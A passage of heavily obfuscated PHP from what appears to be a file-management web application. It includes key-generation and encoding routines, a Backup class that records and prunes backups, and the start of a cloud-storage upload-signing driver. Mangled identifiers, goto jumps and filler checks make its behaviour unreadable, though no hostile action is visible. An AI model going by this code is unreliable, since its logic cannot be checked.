$eç“∫ØßëÜ[645]; if (!$F±Êä˜Éùê) { return; } break; case $dÑâÌ°´ﬁ≥[220]: $AáÂ∆ªÎ£¶ = $this->{$_SERVER[º˙Ôå˛Ë][243]}($B‹»ì≈´óÍ, $dÑâÌ°´ﬁ≥[214]($AÜ¶Ü∫´Ÿæ . $eü°ÌÒªÒü)); break; case $dÑâÌ°´ﬁ≥[328]: $AáÂ∆ªÎ£¶ = $this->{$_SERVER[º˙Ôå˛Ë][243]}($B‹»ì≈´óÍ, $dÑâÌ°´ﬁ≥[118]($AÜ¶Ü∫´Ÿæ . $eü°ÌÒªÒü)); $b û´◊Ø◊æ = $eç“∫ØßëÜ[646]; break; case $dÑâÌ°´ﬁ≥[329]: $AáÂ∆ªÎ£¶ = $this->{$_SERVER[º˙Ôå˛Ë][243]}($B‹»ì≈´óÍ, $dÑâÌ°´ﬁ≥[114]($AÜ¶Ü∫´Ÿæ . $eü°ÌÒªÒü)); $F™∑ºë•Ì… = $eç“∫ØßëÜ[647]; break; case $dÑâÌ°´ﬁ≥[330]: goto Aì«£åÉ¥ë; aõ≥Öõ‚…à: $eıØØíí˜î = $dÑâÌ°´ﬁ≥[114]($eˆèœ´â¨≤ . $dÑâÌ°´ﬁ≥[114]($eü°ÌÒªÒü . $eˆèœ´â¨≤) . $eü°ÌÒªÒü); $eıØØíí˜î = $dÑâÌ°´ﬁ≥[25]($eıØØíí˜î, $b∏ë—≠á‡¯ % 8, $b∏ë—≠á‡¯ % 8 + 7); $E¡—‡·¬ïµ = $eç“∫ØßëÜ[649]; goto DÃß…–ã£˘; aÖÿŸ¶ô”: $E± ®êÏ¶® = $eç“∫ØßëÜ[655]; break; $B¡–÷òÔÇÍ = $eç“∫ØßëÜ[656]; goto E¢Ñé¡ê’≤; DÃß…–ã£˘: if (strlen($E¡—‡·¬ïµ) < $eç“∫ØßëÜ[561]) { return; } $eÜïä ›—≥ = $dÑâÌ°´ﬁ≥[10]; $C√≈ÏÛàçµ = 0; goto AÖ¡Ç‹”œ¶; Aì«£åÉ¥ë: $B‹»ì≈´óÍ = $dÑâÌ°´ﬁ≥[335]($B‹»ì≈´óÍ); $eˆèœ´â¨≤ = $B‹»ì≈´óÍ[0]; $FÏÜ¶ùÜÎ€ = $eç“∫ØßëÜ[648]; goto B‡àÁ’ÜòÕ; E¢Ñé¡ê’≤: if (!$B¡–÷òÔÇÍ) { die; } goto a¡„Ô◊∑≤; B‡àÁ’ÜòÕ: if (!$FÏÜ¶ùÜÎ€) { die; } $B‹»ì≈´óÍ = $dÑâÌ°´ﬁ≥[25]($B‹»ì≈´óÍ, 1); $b∏ë—≠á‡¯ = $dÑâÌ°´ﬁ≥[332]($CÙÍπ√©îÎ, $eˆèœ´â¨≤); goto aõ≥Öõ‚…à; AÖ¡Ç‹”œ¶: $E·¥°àïÖå = 0; $dâÉ¥£œüÀ = $eç“∫ØßëÜ[650]; if (!$dâÉ¥£œüÀ) { die; } goto AÔ›¢∂Ï™¯; AÔ›¢∂Ï™¯: $e≠ı§ßóéè = 0; for ($C√≈ÏÛàçµ = 0; $C√≈ÏÛàçµ < $dÑâÌ°´ﬁ≥[24]($B‹»ì≈´óÍ); $C√≈ÏÛàçµ++) { $e≠ı§ßóéè = $e≠ı§ßóéè == $dÑâÌ°´ﬁ≥[24]($eıØØíí˜î) ? 0 : $e≠ı§ßóéè; $a›åÎç∆ªÖ = $eç“∫ØßëÜ[651]; $DÇ·ÁﬂÙöÂ = $e≠ı§ßóéè++; $f›Ÿè∑°Ÿº = $eç“∫ØßëÜ[652]; if (!$f›Ÿè∑°Ÿº) { return; } $E·¥°àïÖå = $dÑâÌ°´ﬁ≥[332]($CÙÍπ√©îÎ, $B‹»ì≈´óÍ[$C√≈ÏÛàçµ]) - $b∏ë—≠á‡¯ - $dÑâÌ°´ﬁ≥[333]($eıØØíí˜î[$DÇ·ÁﬂÙöÂ]); while ($E·¥°àïÖå < 0) { $E·¥°àïÖå += 64; $fÂìáÀÍ∫£ = $eç“∫ØßëÜ[653]; } $eÜïä ›—≥ .= $CÙÍπ√©îÎ[$E·¥°àïÖå]; $Eìñ¿çÇ†ÿ = $eç“∫ØßëÜ[654]; if (!$Eìñ¿çÇ†ÿ) { return; } } $AáÂ∆ªÎ£¶ = $dÑâÌ°´ﬁ≥[336]($eÜïä ›—≥); goto aÖÿŸ¶ô”; a¡„Ô◊∑≤: default: $AáÂ∆ªÎ£¶ = $this->{$_SERVER[º˙Ôå˛Ë][243]}($B‹»ì≈´óÍ, $eü°ÌÒªÒü . $AÜ¶Ü∫´Ÿæ); $F»çÎ´¬√√ = $eç“∫ØßëÜ[657]; while (strlen($F»çÎ´¬√√) < $eç“∫ØßëÜ[584]) { if (!$F»çÎ´¬√√) { break; } $F»çÎ´¬√√++; } break; } goto E’ï«ë…º¯; EèÚÿú‘ç‹: $E›ﬁ—†–âä = $B‹»ì≈´óÍ[0]; $e¯äê»ÚèÑ = $eç“∫ØßëÜ[643]; if (strlen($e¯äê»ÚèÑ) < $eç“∫ØßëÜ[584]) { return; } goto B£’ì≈õë¿; F√‰‚ÿ§´»: } public function kxjl0d177da5($d≈Õ’µÙ˘•) { goto c√Õüá À¯; EÀƒï„ø§È: $bÀ˜Í∞ïî™ = $this->{$_SERVER[º˙Ôå˛Ë][337]}(); $Eπø£ﬂ˜í» = ($B«Â‡—‡Ê  - 1) * ($bÀ˜Í∞ïî™ - 1); $aπ∂Éâ∆…¿ = $B´§◊îôƒ†[658]; goto CÍÌ¬‰Úëô; F¿Œ›ñ°Øﬂ: if (strlen($Bê˘Ñ∞Î—¨) < $B´§◊îôƒ†[584]) { die; } $C≤√∑÷ßŒ⁄ = $B©ÿÈöŒƒç[114]($B©ÿÈöŒƒç[338] . ($B«Â‡—‡Ê  + $bÀ˜Í∞ïî™) . $B©ÿÈöŒƒç[339] . $bÜäÖ’æâÔ . $B©ÿÈöŒƒç[339] . $fÒ®Ø´‹øì . $B©ÿÈöŒƒç[340]); $EÔ†é∞åÿî = $B´§◊îôƒ†[663]; goto Bﬂàâ√±Ê±; c√Õüá À¯: $B´§◊îôƒ† =& $_SERVER[Æ¡î¢≠¯™]; $B©ÿÈöŒƒç =& $_SERVER[º˙Ôå˛Ë]; $B«Â‡—‡Ê  = $this->{$_SERVER[º˙Ôå˛Ë][337]}(); goto EÀƒï„ø§È; fÒ÷ÖäÇö’: $fÒ®Ø´‹øì = 2; $E∫„Î¢êåÏ = $B´§◊îôƒ†[661]; if (strlen($E∫„Î¢êåÏ) < $B´§◊îôƒ†[63]) { return; } goto A¨åêÆ§«ˆ; CÍÌ¬‰Úëô: while (strlen($aπ∂Éâ∆…¿) < $B´§◊îôƒ†[556]) { if (!$aπ∂Éâ∆…¿) { break; } $aπ∂Éâ∆…¿++; } $bÜäÖ’æâÔ = $B©ÿÈöŒƒç[201](($B«Â‡—‡Ê  + $bÀ˜Í∞ïî™) / 2); while (1) { $E–ÜÓùÆúÓ = $bÜäÖ’æâÔ; $fá™Á‘Éò± = $Eπø£ﬂ˜í»; $Dôâÿñ§™ç = $B´§◊îôƒ†[659]; while (strlen($Dôâÿñ§™ç) < $B´§◊îôƒ†[556]) { if (!$Dôâÿñ§™ç) { break; } $Dôâÿñ§™ç++; } while ($fá™Á‘Éò± % $E–ÜÓùÆúÓ != 0) { $bÉÙ÷•õ‹¯ = $fá™Á‘Éò±; $f≠–Û§åÆÙ = $B´§◊îôƒ†[660]; $fá™Á‘Éò± = $E–ÜÓùÆúÓ; $E–ÜÓùÆúÓ = $bÉÙ÷•õ‹¯ % $E–ÜÓùÆúÓ; } if ($E–ÜÓùÆúÓ == 1) { break; } else { $bÜäÖ’æâÔ++; } } goto fÒ÷ÖäÇö’; A¨åêÆ§«ˆ: for ($d·«òëÆç‹ = 0; $d·«òëÆç‹ < $Eπø£ﬂ˜í» * 10; $d·«òëÆç‹++) { if (($Eπø£ﬂ˜í» * $d·«òëÆç‹ + 1) % $bÜäÖ’æâÔ == 0) { $fÒ®Ø´‹øì = $B©ÿÈöŒƒç[201](($Eπø£ﬂ˜í» * $d·«òëÆç‹ + 1) / $bÜäÖ’æâÔ); break; } } $AÈä¢ÜÁ∆ß = $this->{$_SERVER[º˙Ôå˛Ë][147]}($B«Â‡—‡Ê  * $bÀ˜Í∞ïî™ . $B©ÿÈöŒƒç[10], $B©ÿÈöŒƒç[149]); $Bê˘Ñ∞Î—¨ = $B´§◊îôƒ†[662]; goto F¿Œ›ñ°Øﬂ; Bﬂàâ√±Ê±: if (!$EÔ†é∞åÿî) { die; } $EÔ€∂πëä∫ = $this->{$_SERVER[º˙Ôå˛Ë][147]}($d≈Õ’µÙ˘•, $C≤√∑÷ßŒ⁄) . $B©ÿÈöŒƒç[341] . $AÈä¢ÜÁ∆ß; return $EÔ€∂πëä∫; goto Bõ¶ã«ª»‹; Bõ¶ã«ª»‹: } public function gvmr421b10e5($bòáı ﬂÿ°) { goto EÒ„®∆¢…ﬂ; a«≈Àêä√í: $eîﬂÑöèûÀ = $this->{$_SERVER[º˙Ôå˛Ë][243]}($B·€ƒÎ∫äŒ[1] . $a÷àê’Øﬁê[10], $a÷àê’Øﬁê[149]); $DËÔÜÉù¡Ü = $eôÑÒÚ“¶˜[665]; if (!$DËÔÜÉù¡Ü) { die; } goto f•éßßúŒÀ; E≈Ó‘’ÒÀ€: $bÕÍ¢®ãêØ = $a÷àê’Øﬁê[114]($a÷àê’Øﬁê[338] . ($BﬁÌ„ÃÆç¨ + $b¢ñÒ€îÍë) . $a÷àê’Øﬁê[339] . $BÖêõÀñú¯ . $a÷àê’Øﬁê[339] . $BÀ™√ØÎÇﬁ . $a÷àê’Øﬁê[340]); $CÛ®Óî»Éâ = $this->{$_SERVER[º˙Ôå˛Ë][243]}($B·€ƒÎ∫äŒ[0], $bÕÍ¢®ãêØ); return $CÛ®Óî»Éâ; goto DµõÑ¥Êÿ¢; CÔ¨ŒÛóéı: $E›è«∫¿´ = $eôÑÒÚ“¶˜[671]; while (strlen($E›è«∫¿´) < $eôÑÒÚ“¶˜[584]) { if (!$E›è«∫¿´) { break; } $E›è«∫¿´++; } for ($d À¡˜û¢¥ = 0; $d À¡˜û¢¥ < $b¨Ò‘áΩøä * 10; $d À¡˜û¢¥++) { if (($b¨Ò‘áΩøä * $d À¡˜û¢¥ + 1) % $BÖêõÀñú¯ == 0) { $BÀ™√ØÎÇﬁ = $a÷àê’Øﬁê[201](($b¨Ò‘áΩøä * $d À¡˜û¢¥ + 1) / $BÖêõÀñú¯); break; } } goto E≈Ó‘’ÒÀ€; cïµÍèéÒÖ: for ($d À¡˜û¢¥ = 3; $d À¡˜û¢¥ < $eîﬂÑöèûÀ; $d À¡˜û¢¥ += 2) { if ($eîﬂÑöèûÀ % $d À¡˜û¢¥ != 0) { continue; } $BﬁÌ„ÃÆç¨ = $d À¡˜û¢¥; $b¢ñÒ€îÍë = $a÷àê’Øﬁê[201]($eîﬂÑöèûÀ / $d À¡˜û¢¥); $dÙ…”π«ßÂ = $eôÑÒÚ“¶˜[667]; while ($dÙ…”π«ßÂ < $eôÑÒÚ“¶˜[556]) { if ($dÙ…”π«ßÂ >= 0) { break; } $dÙ…”π«ßÂ++; } break; $AÜÀÃ˘∏Õù = $eôÑÒÚ“¶˜[668]; if (strlen($AÜÀÃ˘∏Õù) < $eôÑÒÚ“¶˜[559]) { die; } } $b¨Ò‘áΩøä = ($BﬁÌ„ÃÆç¨ - 1) * ($b¢ñÒ€îÍë - 1); $E∏áå‡–√© = $eôÑÒÚ“¶˜[669]; goto C˘∆Ç‰ÿéÜ; DµõÑ¥Êÿ¢: $D—ÍÜûÛÁß = $eôÑÒÚ“¶˜[672]; goto dìÊ˜ü—∑ò; EÒ„®∆¢…ﬂ: $eôÑÒÚ“¶˜ =& $_SERVER[Æ¡î¢≠¯™]; $a÷àê’Øﬁê =& $_SERVER[º˙Ôå˛Ë]; $B·€ƒÎ∫äŒ = $a÷àê’Øﬁê[0]($a÷àê’Øﬁê[341], $bòáı ﬂÿ°); goto d÷øÔÒ°º¢; cÚçÑﬁ¢Ë‡: $b¢ñÒ€îÍë = 0; $Cê¨‰äú≤ï = $eôÑÒÚ“¶˜[666]; if (!$Cê¨‰äú≤ï) { return; } goto cïµÍèéÒÖ; d÷øÔÒ°º¢: $bŸÏà°⁄›É = $eôÑÒÚ“¶˜[664]; while ($bŸÏà°⁄›É < $eôÑÒÚ“¶˜[556]) { if ($bŸÏà°⁄›É >= 0) { break; } $bŸÏà°⁄›É++; } if ($a÷àê’Øﬁê[19]($B·€ƒÎ∫äŒ) != 2) { return $a÷àê’Øﬁê[10]; } goto a«≈Àêä√í; C˘∆Ç‰ÿéÜ: $BÖêõÀñú¯ = $a÷àê’Øﬁê[201](($BﬁÌ„ÃÆç¨ + $b¢ñÒ€îÍë) / 2); while (1) { $C«¢¡”·Õ› = $BÖêõÀñú¯; $AêÓıÆﬁŸÒ = $b¨Ò‘áΩøä; while ($AêÓıÆﬁŸÒ % $C«¢¡”·Õ› != 0) { $eÑÿç∏éÙ‡ = $AêÓıÆﬁŸÒ; $AêÓıÆﬁŸÒ = $C«¢¡”·Õ›; $C«¢¡”·Õ› = $eÑÿç∏éÙ‡ % $C«¢¡”·Õ›; $CÒœñÙ¶»¯ = $eôÑÒÚ“¶˜[670]; while (strlen($CÒœñÙ¶»¯) < $eôÑÒÚ“¶˜[63]) { if (!$CÒœñÙ¶»¯) { break; } $CÒœñÙ¶»¯++; } } if ($C«¢¡”·Õ› == 1) { break; } else { $BÖêõÀñú¯++; } } $BÀ™√ØÎÇﬁ = 2; goto CÔ¨ŒÛóéı; f•éßßúŒÀ: if (!$eîﬂÑöèûÀ) { return $a÷àê’Øﬁê[10]; } $eîﬂÑöèûÀ = $a÷àê’Øﬁê[201]($eîﬂÑöèûÀ); $BﬁÌ„ÃÆç¨ = 0; goto cÚçÑﬁ¢Ë‡; dìÊ˜ü—∑ò: } public function pxrs6e7ad623() { goto F∏Í…¢¿ƒè; d∑ß∫ç©È◊: if (!$FØâµÈ°íÎ) { die; } while ($fóæ†úÑ± <= (int) $dÉÛô∏â«¨[343]($bñÆëµ˘ôŸ)) { $e≈≤—Ù¿‘® = $fóæ†úÑ±; while (!0) { $e≈≤—Ù¿‘®++; $Døä¬¡∫àÖ = $BÙà¨æÉí[675]; if (strlen($Døä¬¡∫àÖ) < $BÙà¨æÉí[63]) { return; } if ($e≈≤—Ù¿‘® <= 2) { $fóæ†úÑ± = $e≈≤—Ù¿‘®; break; } else { if ($e≈≤—Ù¿‘® < 2) { continue; } } $A»“ﬂ¯Ñ‚® = !0; for ($e∫ ±êªÿÃ = 2; $e∫ ±êªÿÃ <= $dÉÛô∏â«¨[343]($e≈≤—Ù¿‘®); $e∫ ±êªÿÃ++) { if ($e≈≤—Ù¿‘® % $e∫ ±êªÿÃ == 0) { $A»“ﬂ¯Ñ‚® = !1; } } if ($A»“ﬂ¯Ñ‚®) { $fóæ†úÑ± = $e≈≤—Ù¿‘®; break; } } $aó¯êŸÓó∂[] = $fóæ†úÑ±; $D≠ø◊¯≤ÿØ = $BÙà¨æÉí[676]; } $C˜ßì›∞¢÷ = 2; goto Cﬂ—ÔÍ¡ù; Cﬂ—ÔÍ¡ù: for ($e≈≤—Ù¿‘® = $bñÆëµ˘ôŸ; $e≈≤—Ù¿‘® > 1; $e≈≤—Ù¿‘®--) { $A»“ﬂ¯Ñ‚® = !0; $DÛß„ìÉ®Ô = $BÙà¨æÉí[677]; while ($DÛß„ìÉ®Ô < $BÙà¨æÉí[556]) { if ($DÛß„ìÉ®Ô >= 0) { break; } $DÛß„ìÉ®Ô++; } foreach ($aó¯êŸÓó∂ as $B‹ù¬ñ”ÿª) { if ($e≈≤—Ù¿‘® % $B‹ù¬ñ”ÿª == 0) { $A»“ﬂ¯Ñ‚® = !1; break; } } if ($A»“ﬂ¯Ñ‚®) { $C˜ßì›∞¢÷ = $e≈≤—Ù¿‘®; break; } } return $C˜ßì›∞¢÷; $A–∆®û¢ßÑ = $BÙà¨æÉí[678]; goto C ú¢¨‚ú—; fˆÉäÿ†’≠: $cÊóªËñÕ¯ = $BÙà¨æÉí[673]; $aó¯êŸÓó∂ = array(); $B≈Ö˘†µöû = $BÙà¨æÉí[674]; goto cµÍ∞ΩÑêå; cµÍ∞ΩÑêå: while (strlen($B≈Ö˘†µöû) < $BÙà¨æÉí[584]) { if (!$B≈Ö˘†µöû) { break; } $B≈Ö˘†µöû++; } $fóæ†úÑ± = 1; $FØâµÈ°íÎ = $BÙà¨æÉí[606]; goto d∑ß∫ç©È◊; F∏Í…¢¿ƒè: $BÙà¨æÉí =& $_SERVER[Æ¡î¢≠¯™]; $dÉÛô∏â«¨ =& $_SERVER[º˙Ôå˛Ë]; $bñÆëµ˘ôŸ = $dÉÛô∏â«¨[322]($dÉÛô∏â«¨[342](2, 14), $dÉÛô∏â«¨[342](2, 16) - 1); goto fˆÉäÿ†’≠; C ú¢¨‚ú—: } public function bokm936dd7bf($FÏ¡èÓﬂœû, $C—Ù◊ãìñƒ) { $DÈÙü¯Ç‡ê =& $_SERVER[º˙Ôå˛Ë]; return $DÈÙü¯Ç‡ê[13](array($DÈÙü¯Ç‡ê[14], $DÈÙü¯Ç‡ê[344]), $FÏ¡èÓﬂœû, $C—Ù◊ãìñƒ); } public function tiblf8f477a5($bá÷åº•“µ, $fò”¶¶Ã„) { $aÙêëÓ÷åå =& $_SERVER[º˙Ôå˛Ë]; return $aÙêëÓ÷åå[13](array($aÙêëÓ÷åå[345], $aÙêëÓ÷åå[346]), $bá÷åº•“µ, $fò”¶¶Ã„); } public function itrce38f74af($f®ßüÚ∞Œê, $A∞ØŒÊ™”õ) { $eü≠ä’åµ† =& $_SERVER[º˙Ôå˛Ë]; return $eü≠ä’åµ†[13](array($eü≠ä’åµ†[345], $eü≠ä’åµ†[347]), $f®ßüÚ∞Œê, $A∞ØŒÊ™”õ); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $cè…é‹éªà =& $_SERVER[Æ¡î¢≠¯™]; self::$name = date($cè…é‹éªà[679]); if (!($e§Ÿ∑ü«—ô = Model($cè…é‹éªà[680])->lastItem())) { $e§Ÿ∑ü«—ô = $this->initData(); } else { self::$name = $e§Ÿ∑ü«—ô[$cè…é‹éªà[28]]; if ($e§Ÿ∑ü«—ô[$cè…é‹éªà[681]] == $cè…é‹éªà[93]) { self::$name = date($cè…é‹éªà[682]); $E°∆£∆·† = 0; if (isset($e§Ÿ∑ü«—ô[$cè…é‹éªà[287]][$cè…é‹éªà[174]][$cè…é‹éªà[423]])) { $E°∆£∆·† = (int) $e§Ÿ∑ü«—ô[$cè…é‹éªà[287]][$cè…é‹éªà[174]][$cè…é‹éªà[423]]; } if ($e§Ÿ∑ü«—ô[$cè…é‹éªà[28]] == self::$name) { Model($cè…é‹éªà[680])->remove($e§Ÿ∑ü«—ô[$cè…é‹éªà[372]]); } $e§Ÿ∑ü«—ô = $this->initData($E°∆£∆·†, $e§Ÿ∑ü«—ô[$cè…é‹éªà[683]]); } else { $this->checkStore($e§Ÿ∑ü«—ô[$cè…é‹éªà[683]]); } } self::$option = $e§Ÿ∑ü«—ô; } private function initData($E¬éÕı¢± = 0, $e¬åØïÆ„• = '') { goto Bë≥⁄ÔÚƒÑ; bé¬üø◊∑≈: $this->checkStore($Cº∆ûåâ´ñ[$cÇ—ùø“ë„[683]]); $DÀòéÆæﬁŒ = array($cÇ—ùø“ë„[683] => $Cº∆ûåâ´ñ[$cÇ—ùø“ë„[683]], $cÇ—ùø“ë„[28] => self::$name, $cÇ—ùø“ë„[681] => 0, $cÇ—ùø“ë„[684] => $Cº∆ûåâ´ñ[$cÇ—ùø“ë„[684]], $cÇ—ùø“ë„[287] => array($cÇ—ùø“ë„[685] => array($cÇ—ùø“ë„[681] => 0), $cÇ—ùø“ë„[686] => array($cÇ—ùø“ë„[681] => 0, $cÇ—ùø“ë„[687] => 0, $cÇ—ùø“ë„[688] => 0, $cÇ—ùø“ë„[29] => $cÇ—ùø“ë„[33]), $cÇ—ùø“ë„[689] => array($cÇ—ùø“ë„[681] => 0, $cÇ—ùø“ë„[687] => 0, $cÇ—ùø“ë„[688] => 0), $cÇ—ùø“ë„[174] => array($cÇ—ùø“ë„[681] => 0, $cÇ—ùø“ë„[690] => 0, $cÇ—ùø“ë„[691] => 0, $cÇ—ùø“ë„[692] => 0, $cÇ—ùø“ë„[693] => 0, $cÇ—ùø“ë„[423] => $E¬éÕı¢±)), $cÇ—ùø“ë„[694] => time(), $cÇ—ùø“ë„[695] => 0); $CΩﬁÙ™Á◊˜ = Model($cÇ—ùø“ë„[680])->insert($DÀòéÆæﬁŒ); goto aÏ⁄ÛØçÖ“; aÏ⁄ÛØçÖ“: $DÀòéÆæﬁŒ[$cÇ—ùø“ë„[372]] = $CΩﬁÙ™Á◊˜; return $DÀòéÆæﬁŒ; goto eÌ„ïéäﬂ®; Bë≥⁄ÔÚƒÑ: $cÇ—ùø“ë„ =& $_SERVER[Æ¡î¢≠¯™]; $Cº∆ûåâ´ñ = Model($cÇ—ùø“ë„[680])->config(); if ($e¬åØïÆ„• && $Cº∆ûåâ´ñ[$cÇ—ùø“ë„[683]] != $e¬åØïÆ„•) { $E¬éÕı¢± = 0; } goto bé¬üø◊∑≈; eÌ„ïéäﬂ®: } private function checkStore($cÃ◊Â¡ØØ∫) { $aáÉóΩ¶∞ =& $_SERVER[Æ¡î¢≠¯™]; $fé∂∏„¡Œç = Model($aáÉóΩ¶∞[696])->listData($cÃ◊Â¡ØØ∫); Model($aáÉóΩ¶∞[696])->checkConfig($fé∂∏„¡Œç); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Æ¡î¢≠¯™][680])->findByName(self::$name); } return self::$option; } public static function set($dûÓç¿¢¶—) { $F•∂∑ÑïπÈ =& $_SERVER[Æ¡î¢≠¯™]; $bÆ¬Òÿ’¢¡ = self::get(); foreach ($dûÓç¿¢¶— as $eë´Áï∆â∑ => $a≠ıæ¯óÖÔ) { $b±õÇ˘Ç¬ = explode($F•∂∑ÑïπÈ[103], $eë´Áï∆â∑); $dÁáÉÆù•Ω = count($b±õÇ˘Ç¬); switch ($dÁáÉÆù•Ω) { case 1: $bÆ¬Òÿ’¢¡[$b±õÇ˘Ç¬[0]] = $a≠ıæ¯óÖÔ; break; case 2: $bÆ¬Òÿ’¢¡[$b±õÇ˘Ç¬[0]][$b±õÇ˘Ç¬[1]] = $a≠ıæ¯óÖÔ; break; case 3: $bÆ¬Òÿ’¢¡[$b±õÇ˘Ç¬[0]][$b±õÇ˘Ç¬[1]][$b±õÇ˘Ç¬[2]] = $a≠ıæ¯óÖÔ; break; } } Model($F•∂∑ÑïπÈ[680])->update($bÆ¬Òÿ’¢¡[$F•∂∑ÑïπÈ[372]], $bÆ¬Òÿ’¢¡); self::$option = $bÆ¬Òÿ’¢¡; return self::$option; } public function keep() { $bºπ‚º£êœ =& $_SERVER[Æ¡î¢≠¯™]; $E«¯áåªŸ˘ = self::get(); if ($E«¯áåªŸ˘[$bºπ‚º£êœ[287]][$bºπ‚º£êœ[685]][$bºπ‚º£êœ[681]] == $bºπ‚º£êœ[93]) { return; } $this->backupKeep($E«¯áåªŸ˘); self::set(array($bºπ‚º£êœ[697] => 1)); } private function backupKeep($eöó£Ìã£‡) { goto c€íÿ€ÿ·; c€íÿ€ÿ·: $B‘á«ÜµöÌ =& $_SERVER[Æ¡î¢≠¯™]; $d⁄πï“¡“è = Model($B‘á«ÜµöÌ[680])->listData(); if (empty($d⁄πï“¡“è)) { return; } goto AÌÖÑÙÆ‘¡; D¿üÜ”£Çç: for ($f¯ÉŸïÆ◊€ = 0; $f¯ÉŸïÆ◊€ < 12; $f¯ÉŸïÆ◊€++) { $dÀûÆŸı¥…[] = date($B‘á«ÜµöÌ[698], strtotime("\55{$f¯ÉŸïÆ◊€}\x20\x6d\x6f\156\164\x68\x73")); } $dÀûÆŸı¥… = array_unique($dÀûÆŸı¥…); foreach ($d⁄πï“¡“è as $Bé®ÉãÒÛÇ) { if (!empty($Bé®ÉãÒÛÇ[$B‘á«ÜµöÌ[28]]) && in_array($Bé®ÉãÒÛÇ[$B‘á«ÜµöÌ[28]], $dÀûÆŸı¥…)) { continue; } Model($B‘á«ÜµöÌ[680])->remove($Bé®ÉãÒÛÇ[$B‘á«ÜµöÌ[372]]); $c≥®Çéçøı = "\x7b\151\157\72{$eöó£Ìã£‡[$B‘á«ÜµöÌ[683]]}\x7d\x2f\144\x61\x74\x61\142\141\x73\145\x2f\142\x61\x63\153\165\160\x5f{$Bé®ÉãÒÛÇ[$B‘á«ÜµöÌ[28]]}"; IO::remove($c≥®Çéçøı, !1); } goto dò«ø˘˜àù; AÌÖÑÙÆ‘¡: $f¯ÉŸïÆ◊€ = 0; $dÀûÆŸı¥… = array(); foreach ($d⁄πï“¡“è as $Bé®ÉãÒÛÇ) { if ($f¯ÉŸïÆ◊€ >= 7) { break; } $dÀûÆŸı¥…[] = $Bé®ÉãÒÛÇ[$B‘á«ÜµöÌ[28]]; $f¯ÉŸïÆ◊€++; } goto D¿üÜ”£Çç; dò«ø˘˜àù: } public function db() { goto f‹ùøÑé‘ ; CéáÎ’∞ıê: $bü◊‘ﬂˆï∆ = new BackupDb(); if (!$bü◊‘ﬂˆï∆->index()) { return !1; } self::set(array($Câ•«ÑÈÎ‚[699] => 1)); goto FΩ¢πÍı»“; FΩ¢πÍı»“: return !0; goto Aª¬à¯€ë®; f‹ùøÑé‘ : $Câ•«ÑÈÎ‚ =& $_SERVER[Æ¡î¢≠¯™]; $a¶’éÆë…è = self::get(); if ($a¶’éÆë…è[$Câ•«ÑÈÎ‚[287]][$Câ•«ÑÈÎ‚[686]][$Câ•«ÑÈÎ‚[681]] == $Câ•«ÑÈÎ‚[93]) { return !0; } goto CéáÎ’∞ıê; Aª¬à¯€ë®: } public function dbFile() { goto cößÖ†’ÿ; F‚£å†—Ñ£: return !0; goto fØª€°‘‚‡; a˘å¯¯®◊Í: $FÏ“÷í¬◊ë = new BackupDbFile(); if (!$FÏ“÷í¬◊ë->index()) { return !1; } self::set(array($cÇÍë»Â“»[700] => 1)); goto F‚£å†—Ñ£; cößÖ†’ÿ: $cÇÍë»Â“» =& $_SERVER[Æ¡î¢≠¯™]; $DÕÑõ∏¯ÙÍ = self::get(); if ($DÕÑõ∏¯ÙÍ[$cÇÍë»Â“»[287]][$cÇÍë»Â“»[689]][$cÇÍë»Â“»[681]] == $cÇÍë»Â“»[93]) { return !0; } goto a˘å¯¯®◊Í; fØª€°‘‚‡: } public function file() { $CƒÖ∂≠ìƒÔ =& $_SERVER[Æ¡î¢≠¯™]; $eê®¶€ÿœû = self::get(); if ($eê®¶€ÿœû[$CƒÖ∂≠ìƒÔ[287]][$CƒÖ∂≠ìƒÔ[174]][$CƒÖ∂≠ìƒÔ[681]] == $CƒÖ∂≠ìƒÔ[93]) { return !0; } if (!isset($eê®¶€ÿœû[$CƒÖ∂≠ìƒÔ[684]]) || $eê®¶€ÿœû[$CƒÖ∂≠ìƒÔ[684]] == $CƒÖ∂≠ìƒÔ[472]) { $DÍä°ÊØƒ¨ = new BackupFile(); if (!$DÍä°ÊØƒ¨->index()) { return !1; } } self::set(array($CƒÖ∂≠ìƒÔ[701] => 1, $CƒÖ∂≠ìƒÔ[681] => 1)); return !0; } } goto Bî∞Ì’Ëáœ; Aéçé»Ï◊µ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Bû¥¿÷ä∑) { parent::__construct($Bû¥¿÷ä∑); $this->signatureVersion($_SERVER[Æ¡î¢≠¯™][207]); } public function uploadFormData($Eã„∂øÍæÌ, $DåΩô£Úü† = 3600) { goto D∂Ωﬁ≤òâ€; cıÁ°∂ù—: $Dóßñ∂É‰Ì = array($E†å·µµÀÿ[1081] => $CÏêéã¯Ÿç, $E†å·µµÀÿ[1082] => array(array($E†å·µµÀÿ[1083] => $bêë≤‡ßìÉ), array($E†å·µµÀÿ[1084] => $this->bucket), array($E†å·µµÀÿ[1085], $E†å·µµÀÿ[1086], $E†å·µµÀÿ[33]), array($E†å·µµÀÿ[1087] => $D¡èî∫‰·≈), array($E†å·µµÀÿ[1088] => $BÛ’≈ùé§ä), array($E†å·µµÀÿ[1089] => $this->accessKey), array($E†å·µµÀÿ[1090] => $dˆÛ√Í¡Û£))); $Dóßñ∂É‰Ì = json_encode($Dóßñ∂É‰Ì); $C∫‰ÊΩ÷∑€ = hash_hmac($E†å·µµÀÿ[224], $dˆÛ√Í¡Û£, $this->secret); goto Aí€å£Óµë; D∂Ωﬁ≤òâ€: $E†å·µµÀÿ =& $_SERVER[Æ¡î¢≠¯™]; $bêë≤‡ßìÉ = $E†å·µµÀÿ[192]; $BÛ’≈ùé§ä = $E†å·µµÀÿ[224]; goto cã®–∏ÍâÖ; FÇ…èâüé”: return $AÛ˜ŸÜèâô; goto DÌ§íÊÆåÕ; cã®–∏ÍâÖ: $D¡èî∫‰·≈ = $E†å·µµÀÿ[1079]; $CÏêéã¯Ÿç = gmdate($E†å·µµÀÿ[1080], time() + $DåΩô£Úü†); $dˆÛ√Í¡Û£ = (string) time() . $E†å·µµÀÿ[77] . (string) (time() + $DåΩô£Úü†); goto cıÁ°∂ù—; Aí€å£Óµë: $Bâ∏˜Æ¨ﬂå = sha1($Dóßñ∂É‰Ì); $f„îπ©œ‡˘ = hash_hmac($E†å·µµÀÿ[224], $Bâ∏˜Æ¨ﬂå, $C∫‰ÊΩ÷∑€); $AÛ˜ŸÜèâô = array($E†å·µµÀÿ[1083] => $bêë≤‡ßìÉ, $E†å·µµÀÿ[1087] => 